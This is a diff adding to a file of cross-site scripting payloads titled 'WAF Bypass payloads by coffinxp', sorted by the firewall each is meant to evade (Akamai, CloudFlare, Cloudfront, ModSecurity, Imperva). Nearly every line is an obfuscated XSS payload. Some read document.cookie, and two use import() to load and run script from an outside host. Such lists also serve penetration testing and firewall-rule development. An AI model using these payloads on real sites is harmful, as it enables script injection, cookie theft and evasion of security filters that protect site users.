@@ -1,5 +1,17 @@
 WAF Bypass payloads by coffinxp:
 
+The payload I used to bypass the XSS
+
+1 ><img src=x onerror=alert(document.domain)>
+2 &quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
+3 1\47\42\55\55\41\76\74Img\40Src\40OnError\75confirm\140\113\140\76
+4 <br><center><HTMLinjection</</h1></a></center><!--
+
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+
+<img src=x onerror=alert&#40document.domain&#41>
+
+">%20<img src=o onerror=alert``>//
 
 '"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](document%2Bcookie)>
 
@@ -99,6 +111,38 @@ javascript:%ef%bb%bfalert(XSS)
 <img/src/onerror=alert&sol;&sol;(3)>
 '"/><script%20>alert(document.domain)<%2fscript>.css
 <iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>
+
+SOME OF THE TOP XSS WAF BYPASS PAYLOADS :)
+
+Akamai WAf:
+';k='e'%0Atop['al'+k+'rt'](1)//
+'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
+
+CloudFlare WAf:
+<svg/onload=window["al"+"ert"]1337>
+<Img Src=OnXSS OnError=confirm(1337)>
+<Svg Only=1 OnLoad=confirm(document.domain)>
+<svg onload=alert&#0000000040document.cookie)>
+<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+<Img Src=//X55.is OnLoad%0C=import(Src)>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+
+Cloudfront Waf:
+">'><details/open/ontoggle=confirm('XSS')>
+6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
+';window/*aabb*/['al'%2b'ert'](document./*aabb*/location);//
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
+
+Mod security:
+<svg onload='new Function["Y000!"].find(al\u0065rt)'>
+
+Imperva Waf:
+<Img Src=//X55.is OnLoad%0C=import(Src)>
+<sVg OnPointerEnter="location=javas+cript:ale+rt%2+81%2+9;//</div">
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;
+lert&#x000000028;origin&#x000029;>
+                                       
 /path?next=javascript:top[/al/.source+/ert/.source](document.cookie)
 login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
 <details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc(VulneravelXSS%26%2300000000000000000041//
